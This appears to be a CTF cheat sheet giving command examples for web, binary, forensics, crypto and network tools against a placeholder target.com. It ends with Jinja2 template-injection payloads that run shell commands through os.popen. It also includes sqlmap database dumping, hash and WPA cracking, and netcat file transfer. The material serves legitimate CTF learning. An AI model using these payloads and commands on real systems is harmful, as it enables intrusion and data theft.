# CTF Tools Examples & Use Cases

- [Web Exploitation](#web-exploitation)
- [Binary Exploitation & Reverse Engineering](#binary-exploitation--reverse-engineering)
- [Digital Forensics](#digital-forensics)
- [Cryptography](#cryptography)
- [Network Security](#network-security)
- [Python Tools](#python-tools)
- [Analysis Utilities](#analysis-utilities)

## Web Exploitation

### burpsuite

```bash
# Start Burp Suite
burpsuite &
# Configure browser proxy to 127.0.0.1:8080
# Intercept requests, modify parameters, repeat attacks
```

### dirb

```bash
# Find hidden directories
dirb http://target.com
dirb http://target.com /usr/share/dirb/wordlists/common.txt
dirb https://target.com -X .php,.txt,.bak
```

### gobuster

```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
```

### sqlmap

```bash
# Test URL for SQL injection
sqlmap -u "http://target.com/page.php?id=1"
# Test POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"
# Dump database
sqlmap -u "http://target.com/page.php?id=1" --dump-all
```

### wfuzz

```bash
# Fuzz parameters
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -d "user=admin&pass=FUZZ" http://target.com/login.php
# Fuzz subdirectories
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ/
```

### nikto

```bash
# Web vulnerability scan
nikto -h http://target.com
nikto -h https://target.com -ssl -port 443
```

## Binary Exploitation & Reverse Engineering

### GDB

```bash
# Debug a binary
gdb ./binary
(gdb) run
(gdb) break main        # Set breakpoint
(gdb) continue          # Continue execution
(gdb) x/20x $esp       # Examine stack
(gdb) info registers   # View registers
```

### radare2

```bash
# Analyze binary
r2 ./binary
[0x00400000]> aa        # Analyze all
[0x00400000]> afl       # List functions
[0x00400000]> pdf @main # Disassemble main
[0x00400000]> s main    # Seek to main
```

### strings

```bash
# Extract strings from binary
strings binary
strings -n 10 binary    # Min 10 chars
strings binary | grep -i password
```

### file

```bash
# Identify file type
file suspicious_file
file *                  # Check all files
```

### binwalk

```bash
# Extract embedded files
binwalk firmware.bin
binwalk -e firmware.bin # Extract files
binwalk -A firmware.bin # Architecture analysis
```

### strace/ltrace

```bash
# Trace system calls
strace ./binary
strace -e trace=open,read ./binary
# Trace library calls
ltrace ./binary
```

## Digital Forensics

### foremost

```bash
# Recover files from disk image
foremost -i disk.img -o output/
foremost -t jpg,png,pdf -i disk.img -o recovered/
```

### volatility

```bash
# Memory analysis
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 netscan
```

### exiftool

```bash
# View image metadata
exiftool image.jpg
exiftool -all= image.jpg    # Remove all metadata
exiftool -GPS* image.jpg    # GPS data only
```

### steghide

```bash
# Hide data in image
steghide embed -cf image.jpg -ef secret.txt
# Extract hidden data
steghide extract -sf image.jpg
steghide info image.jpg
```

### scalpel

```bash
# Configure /etc/scalpel/scalpel.conf first
scalpel disk.img -o output/
```

### zsteg

```bash
# Hide data in image
zsteg hide -s secret.txt image.jpg

# Extract hidden data
zsteg extract image.jpg

# zsteg - PNG/BMP steganography detection
zsteg image.png              # Detect hidden data
zsteg -a image.png           # All detection methods
zsteg image.png -E b1,lsb,xy # Extract specific bits
```

## Cryptography

### hashcat

```bash
# Crack MD5 hashes
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# Crack WPA/WPA2
hashcat -m 2500 -a 0 capture.hccapx wordlist.txt
```

### john

```bash
# Crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt  # Show cracked passwords
john --rules hashes.txt # Use rules
```

### openssl

```bash
# Generate hashes
echo -n "password" | openssl md5
# Decrypt files
openssl enc -aes-256-cbc -d -in encrypted.txt -out decrypted.txt
# Base64 decode
echo "SGVsbG8=" | openssl base64 -d
```

## Network Security

### nmap

```bash
# Basic port scan
nmap target.com
# Service detection
nmap -sV target.com
# OS detection
nmap -O target.com
# Script scan
nmap --script vuln target.com
```

### netcat

```bash
# Connect to service
nc target.com 80
# Listen on port
nc -l -p 4444
# Transfer files
nc -l -p 4444 > received_file  # Receiver
nc target.com 4444 < file.txt  # Sender
```

### socat

```bash
# Port forwarding
socat TCP-LISTEN:8080,fork TCP:target.com:80
# SSL connection
socat - OPENSSL:target.com:443
```

## Python Tools

### pwntools

```python
from pwn import *

# Connect to service
r = remote('target.com', 1337)
# Send payload
payload = b'A' * 100 + p64(0xdeadbeef)
r.sendline(payload)
```

### requests

```python
import requests

# GET request
r = requests.get('http://target.com/api')
# POST with data
r = requests.post('http://target.com/login', data={'user': 'admin'})
```

### scapy

```python
from scapy.all import *

# Craft packet
packet = IP(dst="target.com")/TCP(dport=80)
send(packet)
# Sniff traffic
sniff(filter="tcp port 80", count=10)
```

## Analysis Utilities

### hexdump/xxd

```bash
# View file in hex
hexdump -C file.bin
xxd file.bin
# Convert hex to binary
echo "48656c6c6f" | xxd -r -p
```

### p7zip

```bash
# Extract archives
7z x archive.7z
7z x -p"password" encrypted.zip
7z l archive.zip  # List contents
```

## SSTI

```python
# Check environment (optional)
{{config}}

{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

## base64

```bash
echo -n "d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrX20wMjEyNzU4fQ==" | base64 -d
```

`gzip -d disko-1.dd.gz`

[Back to Top](#ctf-tools-examples--use-cases)
